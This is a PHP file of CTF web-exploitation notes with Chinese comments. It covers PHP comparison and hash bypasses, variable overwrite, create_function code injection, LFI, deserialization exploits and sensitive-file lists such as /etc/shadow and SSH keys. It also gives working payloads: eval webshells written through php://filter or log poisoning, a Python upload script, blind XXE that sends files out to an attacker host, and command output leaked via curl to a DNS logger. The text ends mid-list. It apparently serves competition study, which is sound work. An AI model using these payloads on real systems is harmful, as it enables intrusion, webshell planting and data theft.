<?php

//$_REQUESTS解析顺序问题
if($_REQUEST) { 
    foreach($_REQUEST as $key=>$value) { 
        if(preg_match('/[a-zA-Z]/i', $value))  
            //这里不能出现字母,但是可以利用
            //php解析$_REQUESTS时,按照$_ENV(环境变量),$_GET(GET相关参数), $_POST(POST相关参数),$_COOKIE(COOKIE键值), $_SERVER(服务器及运行环境相关信息)的顺序进行加载和同名覆盖
            //所以说我们只要post一个相同的变量值为数字就可以绕过了。比如  http://127.0.0.1?text=aaa&text1=bbb   同时post数据  text=1&text1=2
            die('go away'); 
    } 
} 



// $_SERVER['QUERY_STRING'])            当请求为http://ask.mbatrip.com/?tags/上传时，$_SERVER["QUERY_STRING"] = “tags/上传″，这里不会进行url解码
if($_SERVER) { 
    if (preg_match('/flag|liupi|bupt/i', $_SERVER['QUERY_STRING'])) 
        //?其后的内容 不能出现flag|liupi|bupt,但是这里又必须要出现，(附带查询)
        // 这里便有个tips:$_SERVER['QUERY_STRING']不会进行urldecoe解码,但是$_GET会解码在获取
        die('go away'); 
} 



//preg_match()
$ia = "index.php"; 
if (preg_match('/^buptisfun$/', $_GET['bupt']) && $_GET['bupt'] !== 'buptisfun') { 
  //preg_match正则没有/d的话代表在附近 buptisfun%0a 这样也是匹配成功的
    $ia = $_GET["ia"]; 
} 




//file_get_contents()
if(file_get_contents($ia)!=='buptisfun') { 
    die('go away'); 
    //这个可以用file_get_contents可以读取协议来绕过,直接读取变量会报错
    //ia=data://text/plain,buptisfun      会输出buptisfun
    //ia=data://text/plain;base64,SSBsb3ZlIFBIUAo=      会输出后面那段字符串base64解码后的数据
}



//foreach()和$$造成的变量覆盖
foreach (array('_COOKIE','_POST','_GET') as $_request)  
{
    foreach ($$_request as $_key=>$_value)  
    {
        $$_key=  $_value;  // $_key的值是用户输入的，这里使用两个$,导致了可以注册任意变量
    }
}


//数组绕过sha类型比较、extract()经典变量覆盖、create_function()进行代码注入
//Payload: liupi[]=x&flag[arg]=}phpinfo();//&flag[action]=create_function
$liupi = $_GET['liupi'];
$action='';
$arg='';
if(substr($_GET['liupi'], 32) === sha1($_GET['liupi'])) {   //这里经典的是数组绕过sha类型比较， liupi[]=x即可绕过
    extract($_GET["flag"]);   //经典变量覆盖，extract()函数提取键值对，键名为变量名，键值为变量值，    构造flag[action]=???,flag[arg]=???
                              //即可控制$action和$arg的值
}

if(preg_match('/^[a-z0-9_]*$/isD', $action)) {
    die('go away');
} else {
    $action('', $arg); //这里利用create_function()进行代码注入，该函数创建匿名函数，在php7后弃用，
                       //create_function('', '}phpinfo();//')     不管第一个参数，第二个参数的  源码层面， '} 用于闭合前面的语句，  //  用于注释掉后面的，最终执行命令
}


//本地文件包含  LFI
$file = $_GET['file'];
if (file_exists('/home/wwwrun/'.$file.'.php')) {
  include '/home/wwwrun/'.$file.'.php';
}
/*截断.php的方式有以下几种
1、 %00截断
?file=../../../../../../../../../etc/passwd%00    （需要 magic_quotes_gpc=off，PHP 小于 5.3.4 有效。）
2、路径长度截断
?file=../../../../../../../../../etc/passwd/././././././.[…]/./././././.   （Linux 需要文件名长于 4096，Windows 需要长于 256。）
3、点号截断
?file=../../../../../../../../../boot.ini/………[…]…………   （只适用 Windows，点号需要长于 256 。）   */









//strcmp字符串比较
  strcmp($_GET['a'],str2)==0   //如果 str1 小于 str2 返回 < 0； 如果 str1大于 str2返回 > 0；如果两者相等，返回 0。但是如果
                               //我们传入非字符串类型的数据的时候，这个函数将发生错误，在5.3之前的php中，显示了报错的警告信息后，将return 0 ! 也就是虽然报了错，
                               //但却判定其相等了。因此，解这道题，就只要传入一个非字符串类型的变量即可，一般情况下，我们我们传数组，所以payload为：?a[]=123 



//urldecode二次编码绕过      答案： id=h%2561ckerDJ
<?php
if(eregi("hackerDJ",$_GET[id])) {   //这里会先id的值是否和hackerDJ一致，%25会被浏览器解码为%，所以这里的id=h%61ckerDJ
echo("not allowed!");
exit();
}
$_GET[id] = urldecode($_GET[id]);   //在进行一次url解码， %61会被解码为a，所以这里解码后变为hackerDJ
if($_GET[id] == "hackerDJ")
{
echo "Access granted!";
echo "flag";
}






//16进制与十进制数字比较，将目标数字转换成16进制，该题解为?password=0xdeadc0de
error_reporting(0);
function noother_says_correct($temp)
{
$flag = 'flag{test}';
$one = ord('1'); //ord — 返回字符的 ASCII 码值
$nine = ord('9'); //ord — 返回字符的 ASCII 码值
$number = '3735929054';
// Check all the input characters!
for ($i = 0; $i < strlen($number); $i++)
{
// Disallow all the digits!
$digit = ord($temp{$i});          
if ( ($digit >= $one) && ($digit <= $nine) ) 
{
// Aha, digit not allowed!
return "flase";
}
}
if($number == $temp)
return $flag;
}
$temp = $_GET['password'];
echo noother_says_correct($temp);



//parse_str() 函数 变量覆盖，把查询字符串解析到变量中：parse_str("name=Bill&age=60");  执行之后$name=Bill,$age=60
$key[33]='aaa';
$id=$_GET['id'];
parse_str($id);         // ?id=key[33]=abc,会覆盖掉key[33]原来的值，导致$id=key[33]=abc,   $key[33]=abc
echo $id;
echo $key[33];


//md5($pass,true)问题
md5函数加上true参数后，输出格式被改变，有以下playload
$pass='ffifdyop';
即md5('ffifdyop',true)
md5('ffifdyop',true)='or'6<trash>     6后面是垃圾数据
sql变为SELECT * FROM admin WHERE pass = ''or'6<trash>'    真

//md5绕过(Hash比较缺陷)
if ($Username!=$password && md5($Username) == md5($password)) {$logined = true;}  //题目要求输入两个值，其值不相等但是MD5值相等
                                                                                  //问题在于当某个字符串的md5值是0e开头时，比如
    //另外一种方法，md5无法处理数组，username[]=1&password[]=2即可。                 //md5(QNKCDZO)=0e830400451993494058024219903391
                                                                                  //0e在比较时会被视为科学计数法，所以无论0e后面是什么
                                                                                  //0的多少次方还是0
                                                                                  //md5(QNKCDZO)=0e830400451993494058024219903391
                                                                                  //md5(s878926199a)=0e545993274517709034328855841020 
                                                                                  //md5(s155964671a)=0e342768416822451524974117254469 
                                                                                  //md5(s214587387a)=0e848240448830537924465865611904 
                                                                                  //md5(s214587387a)=0e848240448830537924465865611904
                                                                                  //md5(s878926199a)=0e545993274517709034328855841020
                                                                                  //md5(s1091221200a)=0e940624217856561557816327384675




//数组返回NULL绕过
$flag = "flag";

if (isset ($_GET['password'])) {                             //?password[]=1    由于ereg()和strpos()等函数的参数只能是字符串，因此当参数输入
if (ereg ("^[a-zA-Z0-9]+$", $_GET['password']) === FALSE)    //数组时无法处理返回NULL，当使用三等号===进行比较时，不会对数据类型进行转换
echo 'You password must be alphanumeric';                    //因此 NULL和FALSE不相等
else if (strpos ($_GET['password'], '--') !== FALSE)
die('Flag: ' . $flag);
else
echo 'Invalid password';
}



//数组绕过大小比较 
$_GET['password'] > 9999999      //password[]=1



//ereg正则匹配绕过,只要加了%00，ereg就会出问题，%00后面的内容就不会再进行正则匹配，正则匹配的结果是true还是false只和%00前面的内容有关
if (ereg ("^[a-zA-Z0-9]+$", $_GET['password']) === FALSE)         //%00截断，password=1111%00
//另外，%00进入后端进行处理时，php认为其为一个字符,如下$b=%00122111即可，substr($b,0,1)截到的第一个字符即为%00所代表的字符
if(strlen($b)>5 and eregi("111".substr($b,0,1),"1114") and substr($b,0,1)!=4)



//反序列化漏洞
  //魔术方法
    __construct()  //当一个对象创建(new)时被调用
    __destruct()  //当一个对象销毁时被调用,
    __toString()  //当一个对象被当作一个字符串使用
    __sleep()   //在对象在被序列化之前运行
    __wakeup()  //将在unserialize()反序列化时被调用
  //__construct()、__sleep()一般是在序列化操作时
  //__destruct()、__wakeup()一般是在反序列化操作时
    __get($name)  //当对象调用不可访问属性时，会自动触发
    __call($name,$arguments)   //当对象调用不可访问函数时，会自动触发，其中$name就是调用的这个不可访问的函数名，$arguments是这个函数的参数

//反序列化漏洞写exp时给private、public、protected三种类型的变量赋值时，
public类型的可以直接在类里面赋值：
  class A{
    public $test='xxx';
  }
也可以先new一个对象，然后赋值：
$a=new A();
$a->test='iv4n';
以上两者的区别在于采用第一种方式如果类A中后面还有如__sleep()等函数，在序列化时被值会被改变，但是先new再赋值不会。

private、protected两种类型的就只能在类里面进行赋值：
class A{
  private $test='xxx'
}
或者
class A{
  private $test;
  function __construct(){
    $this->test='xxx';
  }
}
还有一种情况是给private、protected两种类型的变量赋值为new一个另外的类，只能采用如下方式：
class A{}
class B{
  private $test;
  function __construct(){
    $this->test=new A();
  }
}
这里不能再定义$test变量的时候直接赋值，会报错。


//php反序列化绕过_wakeup方法
  当反序列化字符串时，表示属性个数的值大于真实属性个数时，会跳过_wakeup函数的执行
应用场景如下：
源码为：
<?php
class Handle{
  private $Handle;
  public function __wakeup(){
    foreach ($get_object_vars($this) as $k => $v) {
      $this->$k=null;
    }
    echo "Waking up\n";
  }
  public function __construct($handle){
    $this->handle=$handle;
  }
  public functin __destruct(){
    $this->handle->get_Flag();
  }
}
class Flag{
  public $file;
  public $token;
  public $token_flag;

  function __construct($file){
    $this->file=$file;
    $file->token_flag=$this->token=md5(rand(1,10000));
  }
  public function get_Flag(){
    $this->token_flag=md5(rand(1,10000));
    if($this->token===$this->token_flag){
      if(isset($this->file)){
        echo @highlight_file($this->file,true);
      }
    }
  }
}
最后获取 flag 的地方，需要 $this->token === $this->token_flag ，而 $this->token_flag 在每次调用getFlag 函数都会重新生成,
 引用变量来解决这个问题,$this->token = &$this->token_flag;
另外由于在wakeup魔术方法中每次变量都被置null，所以属性个数的值大于真实属性个数，跳过_wakeup函数的执行
str_replace('O:6:"Handle":1', 'O:6:"Handle":10', serialize($handle))

payload 如下：
<?php  
class Handle{ 
    private $handle;  
    public function __construct($handle) { 
        $this->handle = $handle; 
    } 
    public function __destruct(){
        $this->handle->getFlag();
    }
}

class Flag{
    public $file;
    public $token;
    public $token_flag;

    function __construct($file){
        $this->file = $file;
        $this->token = &$this->token_flag;
    }

    public function getFlag(){
        // $this->token_flag = md5(rand(1,10000));
        if($this->token === $this->token_flag)
        {
            if(isset($this->file)){
                echo @highlight_file($this->file,true); 
            }  
        }
    }
}

$flag = new Flag('flag.php');
$handle = new Handle($flag);

echo urlencode(str_replace('O:6:"Handle":1', 'O:6:"Handle":10', serialize($handle)));



//当能够读取文件的时候，一般来说我们都是尝试etc/passwd
成功之后，尝试读取源码等，这里记录下可能会用到的系统文件
/etc/hosts   在需要打内网是，这个文件一般记录着内网的ip
/proc/self/environ  读环境变量，在某一道python的题目中，存在一个secret_key，是通过os.getenv('secret_key')获取，即该key保存在系统环境变量中，同时可以获取python版本等信息
/etc/nginx/sites-available/default  nginx相关配置信息




//Linux敏感文件
/root/.bash_history # bash执行的命令历史记录，历史中可能带着用户的密码 (遇到过现实案例,是输错的情况下参数的,比如没输入 su 却以为自己输了 su)
~/.bash_history  #同上
/etc/passwd # 用户情况
/etc/shadow # 直接 John the Ripper
/usr/local/tomcat/conf/tomcat-users.xml # tomcat 用户配置文件
/etc/hosts # 主机信息，通常配置了一些内网域名
/root/.bashrc # 环境变量
/root/.bash_history # 还有root外的其他用户
/root/.viminfo # vim 信息
/root/.ssh/id_rsa # 拿私钥直接ssh
/proc/xxxx/cmdline # 进程状态枚举 xxxx 可以为0000-9999 使用burpsuite
数据库 config 文件
web 日志 access.log, error.log
ssh 日志
/var/lib/php/sess_PHPSESSID # 非常规问题 session 文件( 参考 平安科技的一道session包含 http://www.jianshu.com/p/2c24ea34566b)

# 网络信息
/proc/net/arp
/proc/net/tcp
/proc/net/udp
/proc/net/dev

Tomcat 控制台可读取用户密码 /usr/local/tomcat/conf/tomcat-users.xml

/proc/sched_debug # 提供cpu上正在运行的进程信息，可以获得进程的pid号，可以配合后面需要pid的利用
/proc/mounts # 挂载的文件系统列表
/proc/net/arp # arp表，可以获得内网其他机器的地址
/proc/net/route # 路由表信息
/proc/net/tcp and /proc/net/udp # 活动连接的信息
/proc/net/fib_trie # 路由缓存
/proc/version  # 内核版本
/proc/[PID]/cmdline # 可能包含有用的路径信息
/proc/[PID]/environ #  程序运行的环境变量信息，可以用来包含getshell
/proc/[PID]/cwd     # 当前进程的工作目录
/proc/[PID]/fd/[#] # 访问file descriptors，某写情况可以读取到进程正在使用的文件，比如access.log

# ssh
/root/.ssh/id_rsa
/root/.ssh/id_rsa.pub
/root/.ssh/authorized_keys
/etc/ssh/sshd_config
/var/log/secure

# network
/etc/sysconfig/network-scripts/ifcfg-eth0
/etc/syscomfig/network-scripts/ifcfg-eth1

# application
/opt/nginx/conf/nginx.conf
/var/www/html/index.html
/root/.mysql_history
/root/.wget-hsts
/etc/my.cnf

# common
/etc/passwd
/etc/shadow
/etc/hosts
/root/.bash_history
/root/.ssh/authorized_keys
/root/.mysql_history
/root/.wget-hsts
/var/www/html/index.html

# protocol
file:///etc/passwd
gopher:///etc/passwd
ftp://

# SSRF 内网探测
url=http://10.29.5.24

# Windows
C:\boot.ini  //查看系统版本
C:\Windows\System32\inetsrv\MetaBase.xml  //IIS配置文件
C:\Windows\repair\sam  //存储系统初次安装的密码
C:\Program Files\mysql\my.ini  //Mysql配置
C:\Program Files\mysql\data\mysql\user.MYD  //Mysql root
C:\Windows\php.ini  //php配置信息
C:\Windows\my.ini  //Mysql配置信息

史上最全Linux提权后获取敏感信息方法：
https://www.freebuf.com/articles/system/23993.html




//php随机函数mt_rand()的安全性 
//mt_rand(min,max) 产生min和max之间的一个伪随机数，mt_srand()可以手动指定种子，同一种子生成的随机数是相同的
//所以当知道mt_rand()函数生成的一个一串随机数时，逆推出其种子便可以得知其余的随机数
//https://github.com/lepiaf/php_mt_seed 这个工具可以逆推种子，其算出来的种子结果可能有多个，只需要分别指定种子看结果是否和原值一致即可验证
//当随机数一串数字可以直接使用这个工具，但是当随机数时多串数字，比如 10 8 9 78 99这种，需要构造指定格式才能放入php_mt_seed函数破解，例子：
//https://bbs.ichunqiu.com/thread-48533-1-1.html




//php:filter
//resource=<要过滤的数据流>  指定了你要筛选过滤的数据流。  必选
//read=<读链的筛选列表>  可以设定一个或多个过滤器名称，以管道符（|）分隔。   可选
//write=<写链的筛选列表>     可以设定一个或多个过滤器名称，以管道符（|）分隔。

//下面是以base64编码的方式输出upload.php的内容，这种方式用来获取指定文件没有经过浏览器处理的源码，
http://106.14.114.127:23336/user.php?page=php://filter/read=convert.base64-encode/resource=upload
//下面是以大写字母并使用rot13加密的方式输出指定地址的内容
http://106.14.114.127:23336/user.php?page=php://filter/read=string.toupper|string.rot13/resource=http://127.0.0.1
//使用上面这种方式读源码时，有时会被waf，比如服务端有如下处理
$keywords = ["flag","manage","ffffllllaaaaggg"];
$uri = parse_url($_SERVER["REQUEST_URI"]);
parse_str($uri['query'], $query);
foreach($keywords as $token)
    {
    foreach($query as $k => $v)
        {
            if (stristr($k, $token))
                hacker();
            if (stristr($v, $token))
                hacker();
        }
    }
//我要访问flag文件，这就导致如果输入的uri中出现flag、manager等被拦截，这里可以针对parse_url的技巧，使用多个//破坏url的正常格式，浏览器可以正常解析，但是这个函数不行，改成下面这样
http://106.14.114.127:23336///user.php?page=php://filter/read=convert.base64-encode/resource=flag    


//$content在开头增加了exit过程，导致即使我们成功写入一句话，也执行不了（这个过程在实战中十分常见，通常出现在缓存、配置文件等等地方，不允许用户直接访问的文件，都会被加上if(!defined(xxx))exit;之类的限制）。那么这种情况下，如何绕过这个“死亡exit”
$content = '<?php exit; ?>';
$content .= $_POST['txt'];
file_put_contents($_POST['filename'], $content);
//幸运的是，这里的$_POST['filename']是可以控制协议的，我们即可使用 php://filter协议来施展魔法：使用php://filter流的base64-decode方法，将$content解码，利用php base64_decode函数特性去除“死亡exit”。
//base64编码中只包含64个可打印字符，而PHP在解码base64时，遇到不在其中的字符时，将会跳过这些字符，仅将合法字符组成一个新的字符串进行解码。
//使用下面方式绕过,post数据为
txt=xxxxxx&filename=php://filter/write=convert.base64-decode/resource=shell.php       //xxxxxx为base64编码过的一句话木马

还有就是 file_put_contents(filename, data) ,这个函数执行写文件操作的时候支持 string、array、stream资源，也就是说支持如下操作：
$file=$dir.'php://filter/write=convert.base64-decode/resource=test1111.txt';
file_put_contents($file, 'PD9waHAgcGhwaW5mbygpOz8+');
这样利用伪协议可以通过base64编码绕过对于写入内容有过滤的地方








//通配符:?    
//当涉及到命令执行，但是php代码实现上又过滤了我必须要访问的文件名，比如我要访问flag.php，但是
//过滤了flag关键字，可以使用通配符
//比如  cat f?ag.php 甚至当前路径下只有少数几个文件，目标文件名长度又是唯一的，如只有flag.php这
//个文件名长度为8，可以使用   cat ????????  (一个?代表一个字符)



#Phar协议问题
#Phar反序列化，Phar:// 伪协议读取phar文件时，会反序列化meta-data储存






//strpos,  查询第二个参数在第一个参数中第一次出现的位置
if (strpos($_SERVER['QUERY_STRING'], "H_game") !==false) {      //可以用.代替_   H.game
    die('step 5 fail');
}






//filter_var
题目：
$url = $_GET['url'];
   echo "Argument: ".$url."\n";
   if(filter_var($url, FILTER_VALIDATE_URL)) {
      $r = parse_url($url);
      var_dump($r);
      if(preg_match('/skysec\.top$/', $r['host'])) 
      {
         exec('curl -v -s "'.$r['host'].'"', $a);
      } else {
         echo "Error: Host not allowed";
      }
   } else {
      echo "Error: Invalid URL";
   }

filter_var($url, FILTER_VALIDATE_URL)的第二个参数：
FILTER_VALIDATE_EMAIL 检查是否为有效邮箱
FILTER_VALIDATE_URL 检查是否为有效url
url=http://skysec.top是符合检查的，url=http://skysec不符合检查，但是url=0://evil.com:23333;skysec.top:80/是符合检查的，
(url=http://evil.com:23333;skysec.top:80/不符合)
之后$r = parse_url($url);
得到$r['host']='evil.com:23333;skysec.top:80'
当使用了exec()函数,例如样题代码中exec('curl -v -s "'.$r['host'].'"', $a);时
这样都可以绕过检测，达到请求任意ip，任意端口的目的

#ip2long()
题目要判断输入内容中是否含有ip，检测方式是通过检查是否含有.    如1.1.1.1，不允许含有.
但是我必须要输入ip，这时可以通过ip2long函数将ip转换为不带点的形式，服务器是识别这种形式的ip的
如  ip2long('1.1.1.1')=16843009














//.swp    非正常关闭vi编辑器时会产生的文件
//比如 正在编辑的文件时 index.php ，那么产生的就是.index.php.swp    
//     正在编辑的文件是 index.html，那么产生的就是.index.html.swp
//访问 http://xxxx.xxxx.com/.index.html.swp




//eregi和ereg的问题（前者同时匹配大小写）
//可以使用数组绕过,ereg是处理字符串，传入数组之后，ereg返回Null
//或者%00截断绕过     如匹配union， 使用un%00ion



//strcmp利用数组绕过
查看php的手册
int strcmp ( string $str1 , string $str2 )
Return Values
Returns < 0 if str1 is less than str2; > 0 if str1 is greater than str2, and 0 if they are equal.
当输入的两个值为不是字符串时就会产生不预期的返回值：比如输入password[]=1




//is_numeric
//当有两个is_numeric判断并用and连接时，and后面的is_numeric可以绕过
$c=is_numeric($a) and is_numeric($b);        //$b可以不是数字，同样返回true








//接收参数中不能出现某一字符，但下面又必须使用可以php://伪协议绕过
//目前遇到的是file_get_contents其他情况具体而定
$data = @file_get_contents($a,'r');
if($data=="1112 is a nice lab!")
{ 
  require("flag.txt");
}
构造如下数据包
POST /111.php?a=php://input HTTP/1.1
Host: 127.0.0.1
User-Agent: python-requests/2.21.0
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
Content-Length: 19
Content-Type: application/x-www-form-urlencoded

1112 is a nice lab!



//file_get_contents()将一个文件的内容读取到字符串中，支持stream数据，可以使用php://input
//file_put_contents()将字符串内容写到文件中去，也支持stream数据






//题目考察对于目录操作相关函数以及数组相关函数的了解
if(';' === preg_replace('/[^\W]+\((?R)?\)/', '', $_GET['code'])) {     //(?R)是php正则的递归模式，这段正则的意思是该题目只能传入
    eval($_GET['code']);                                               //不带参数的函数，形如 func(func(func()));
} else {
    show_source(__FILE__);
}
//解一   涉及到的函数都可以在php手册中搜索 目录、数组  得到
?code=var_dump(file_get_contents(next(array_reverse(scandir(dirname(chdir(next(scandir(getcwd())))))))));
var_dump() 回显执行结果
file_get_contents()  读文件
next() 将数组中的内部指针向前移动一位
array_reverse()  返回单元顺序相反的数组
scandir()  列出指定路径中的文件和目录
dirname()  返回路径中的目录部分
chdir()  将输入的路径更改为工作目录
getcwd()  取得当前工作目录
//解二 
?a=../flag&code=readfile(current(current(get_defined_vars())));
关键在于get_defined_vars()函数，此函数返回一个包含所有已定义变量列表的多维数组，这些变量包括环境变量、服务器变量和用户定义的变量。
这个函数会列出所有的变量包括$_GET('a'),数组很长，之后就是利用各种数组相关的函数调整至输出$_GET('a')
//解三
?code=eval(hex2bin(session_id(session_start())));
并且要设置
payload="echo 'hello world';".encode('hex')
cookies={'PHPSESSID':payload}
以上面这个cookies发送get请求
session_start()  开启session
session_id()  获取/设置当前会话id    但是由于文件会话管理器只允许使用数字、字母、逗号、减号，所以提前将要输入的字符串转十六进制
//解四
利用 getenv()函数，函数作用为获取一个环境变量的值





create_function(args, code)  代码注入问题
这个函数可以理解为生成一个函数并返回一个唯一的名称，例如
$func=create_function('aaa', 'echo 1;')
等价于：
function func($aaa){
  echo 1;
}
那么当我可以控制第二个参数的时候，构造输入
$code='echo 2;}echo time();/*'
等价于：
function func($aaa){
  echo 2;}echo time();/*
}



*/
命令执行，但是有过滤
$str=@(string)$_GET['str'];
blackListFilter($black_list, $str);
eval('$str="'.addslashes($str).'";');

这里如果直接上 phpinfo()，由于有addslashes的作用会出现\”的情况使得命令无法执行
playload为：
?str=${phpinfo()}
这样最里面这个是变量,名为phpinfo(),接下来的一层花括号将其解析为字符串"phpinfo()"



命令执行，但是没有回显
$cmd = $_GET[`cmd`];
`$cmd`;
playload为：
curl http://ip.port.b182oj.ceye.io/`whoami`
利用ceye.io这个网站dns解析时带出命令执行结果，dns得到的访问请求地址为  http://ip.port.b182oj.ceye.io/www-data

curl -K/etc/passwd    这个命令会打印错误信息，暴露一部分/etc/passwd的内容
curl -K/etc/hosts     内网信息

preg_replace(pattern, replacement, subject)
//函数作用：搜索subject中匹配pattern的部分， 以replacement进行替换。 加/e修饰符导致命令执行，但是要注意的时在php7以后不存在这个问题
调用方法：
preg_replace("/test/e",phpinfo(),"jutst test");
payload:
?pat=/test/e&rep=phpinfo()&sub=jutst test
?pat=/test/e&rep=var_dump(`dir`)&sub=jutst test


PHP利用PCRE回溯次数限制绕过某些安全限制
当存在这么一种waf：
function is_php($data){  
    return preg_match('/<\?.*[(`;?>].*/is', $data);  
}
假设该waf在当时题目环境下不能通过其他方式绕过，必须过这个正则，解法如下：
PHP为了防止正则表达式的拒绝服务攻击（reDOS），给pcre设定了一个回溯次数上限pcre.backtrack_limit，回溯次数上限默认是100万。那么，假设我们的回溯次数超过了100万，preg_match返回的非1和0，而是false，所以这个题的解法就是通过发送超长字符串，使正则执行失败，最后绕过目标对php语言的限制
原题为：
<?php
function is_php($data){
    return preg_match('/<\?.*[(`;?>].*/is', $data);
}

if(empty($_FILES)) {
    die(show_source(__FILE__));
}

$user_dir = 'data/' . md5($_SERVER['REMOTE_ADDR']);
$data = file_get_contents($_FILES['file']['tmp_name']);
if (is_php($data)) {
    echo "bad request";
} else {
    @mkdir($user_dir, 0755);
    $path = $user_dir . '/' . random_int(0, 10) . '.php';
    move_uploaded_file($_FILES['file']['tmp_name'], $path);

    header("Location: $path", true, 303);
}
解法py文件为：
import requests
from io import BytesIO

files = {
  'file': BytesIO(b'aaa<?php eval($_POST[txt]);//' + b'a' * 1000000)
}

res = requests.post('http://51.158.75.42:8088/index.php', files=files, allow_redirects=False)
print(res.headers)

还可以以这种方式解决  <script language="php">phpinfo();</script> ,这句话被保存为php文件后是可以正常执行的
前提是目标环境php版本小于7，但是由于该题环境为7所以不能成功，经测试，确实这样。




$_SERVER['SERVER_NAME'] 
这个变量指的是服务器的主机名，但是在apache2中，必须设置useCanonicalName=ON 和 ServerName.否则该值就会由客户端提供，就存在伪造问题
由客户端提供的意思是 $SERVER['SERVER_NAME']取的是请求头的host值，可任意更改






$log_name = $_SERVER['SERVER_NAME'] . $log_name;
if(!in_array(pathinfo($log_name, PATHINFO_EXTENSION), ['php', 'php3', 'php4', 'php5', 'phtml', 'pht'], true)) 
上面这段代码是禁止文件后缀是php相关，解决如下：
php在做路径处理的时候，会递归的删除掉路径中存在的“/.”。所以只要在后缀后面加上/.  ，pathifo()就取不到后缀名了,
比如  test.php/.   就可以绕过
这样 用 file_put_contents(test.php/., 'xxxxxxx')  字符串可以正常写入到test.php文件中







#图片马制作方法
#cmd下 copy 111.jpg /b + 222.php /a  333.jpg



#mysql字符集的问题
utf8->utf8->latin1情况下
username=admin%c2，php的检测if ($username === 'admin')自然就可以绕过的，在mysql中可以正常查出username='admin'的结果。
utf8->utf8->utf8情况下
Ä = A    Ö = O    Ü = U，读音符号最后被认定为英文字母，
据此构造出了admin和guest：
admin:%C3%A0%C4%8F%E1%B9%81%C3%8D%C3%B1        C3A0是à的16进制，对照表 http://collation-charts.org/mysql60/mysql604.utf8_general_ci.european.html
guest:%C4%9D%C3%9B%C3%A8%C5%9B%C5%A3
这种情况下，需要用burp抓包改，直接在浏览器提交的话可能由于编码导致失败


#xml问题
遇到可能是xml问题时，尝试测试
<?xml version="1.0" encoding="UTF-8"?>  
<!DOCTYPE ANY [  
<!ENTITY shit "this is shit">   
]>  
<root>&shit;</root>

xxe任意文件读取：
<?xml version = "1.0"?>
<!DOCTYPE ANY [
    <!ENTITY f SYSTEM "file:///etc/passwd">
]>
<x>&f;</x>

xxe任意文件盲读取：
post.xml：
<?xml version="1.0"?>
<!DOCTYPE ANY[
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % remote SYSTEM "http://vps_ip/evil.xml">
%remote;
%all;
]>
<root>&send;</root>

xxe内网探测：   （内网ip可以通过读 /etc/hosts 文件获取,ip后面必须跟端口，文件路径）
<?xml version = "1.0"?>
<!DOCTYPE ANY [
    <!ENTITY f SYSTEM "http://172.17.0.6:80/index.php?file=php://filter/read=convert.base64-encode/resource=flag.php">
]>
<x>&f;</x>

xxe执行系统命令：（前提是PHP环境里安装了expect扩展）
<?xml version = "1.0"?>
<!DOCTYPE ANY [
    <!ENTITY f SYSTEM "except://ifconfig">
]>
<x>&f;</x>

evil.xml：
<!ENTITY % all "<!ENTITY send SYSTEM 'http://vps_ip/1.php?file=%file;'>">

这样一来，在解析xml的时候：
1.file实体被赋予file:///etc/passwd的内容
2.解析remote值的时候，访问http://vps_ip/evil.xml
3.在解析evil.xml中all实体的时候，将file实体带入
4.访问指定url链接，将数据带出
于是成功造成了blind xxe文件读取


另外我们在开始申明的时候可以规定编码格式，那么倘若后台对 ENTITY 等关键词进行过滤时，我们可以尝试使用UTF-7，UTF-16等编码去Bypass
例如：
<?xml version="1.0" encoding="UTF-16"?>





#文件包含
#利用apache的访问日志或者错误日志来getshell，前提是权限允许，一般情况下/var/log/apache2 文件夹其他用户没有任何权限
/var/log/apache2/access.log
/var/log/apache2/error.log
先通过访问下面这样的连接，（注意！！： 不能简单通过浏览器或者python发包来实现，因为尖括号等符号会被转义记录在日志中，
可以通过burp改包或者curl来实现，另外后面的?>两个闭合符号也必须要写。
http://xxx/index.php?file=<?php @eval($_GET['A']); ?>
使得一句话木马被记录在access.log或者error.log中，
然后包含该文件
http://xxx/index.php?file=/var/log/apache2/access.log
即可getshell
以上，即使不能写进去getshell，如果能够包含这两个文件查看文件内容的话，也可以借此看其他队伍或者出题人的攻击、调试过程，前提是这个题是通过get方式解决的。



题目代码为：
<?php 
ini_set('open_basedir', '/var/www/html:/tmp');
$file='function.php';
$func=isset($_GET['function'])?$_GET['function']:'fileters';
call_user_func($func,$_GET);
include($file);
session_start();
$_SESSION['name']=$_POST['name'];
if($_SESSION['name']=='admin'){header('Location:admin.php');}
?>
问题点在以下两个方面
#call_user_fun() 根据题设需要找到合适的函数，比如使用extract()进行变量覆盖
这里利用call_user_func() 
1、利用extract()函数进行变量覆盖，覆盖$file变量导致本地文件包含，
?function=extract&file=php://filter/read=convert.base64-encode/resource=index.php 读源码
?function=extract&file=/tmp/sess_kpk22r3qq2v69d2uj1iigcp5c2   包含shell
2、利用session_start()
?function=session_start&save_path=/tmp session_start('save_path'=>'/path')，控制本次session的存储位置
#session_start()问题
正常情况下在开启session_start()情况下，sesson信息保存在/var/lib/php/sessions/sess_phpsessid 中，即使题目存在文件包含漏洞
，通常来说该路径因权限限制无法直接包含，但是session_start()函数存在参数可以控制本次session的存储位置，如下：
session_start('save_path'=>'/path')
那么在能够控制session的存储位置之后，需要考虑的就是如何控制session的内容，可以考虑使用下面的session.upload_progress，本题降低难度，题目中写有$_SESSION['name']=$_POST['name'] 导致可以通过post数据控制session内容
post数据为  name=<?php var_dump(scandir('./'));?> ，以此读目录，找flag


#if的问题
if(-1) 和 if(1)  结果都为true


#格式化字符串
$eancrykey='xxxxx';
if(!empty($_POST["nickname"])) {
  $arr = array($_POST["nickname"],$eancrykey);
  $data = "Welcome my friend %s";
  foreach ($arr as $k => $v) {
      $data = sprintf($data,$v);
  }
  echo $data;
  }
当输入的 nickname=%s 时可以成功将$eancrykey输出，原因是
这里由于foreach循环执行，$arr=['%s',$eancrykey],
因此第一次为$data = sprintf('Welcome my friend %s','%s');
   第二次为$data = sprintf('Welcome my friend %s',$eancrykey);
正常情况下若输入nickname=tony，第一次为$data = sprintf('Welcome my friend %s','tony');
                              第二次为$data = sprintf('Welcome my friend tony',$eancrykey);
没有位置输入



#文件包含 lfi  文件包含+phpinfo() 导致getshell
前提：1、存在文件包含漏洞 2、某文件中含有phpinfo();函数，
利用phpinfo会打印上传缓存文件路径的特性，进行缓存文件包含达到getshell
原理：
1、临时文件在phpinfo页面加载完毕后才会被删除
2、phpinfo页面会将所有数据都打印出来，包括header
3、php默认的缓冲区大小为4096，可以理解为php每次返回4096个字节给socket连接
那么我们的竞争流程可以总结为：
1、发送包含了webshell的上传数据包给phpinfo页面，同时在header中塞满垃圾数据
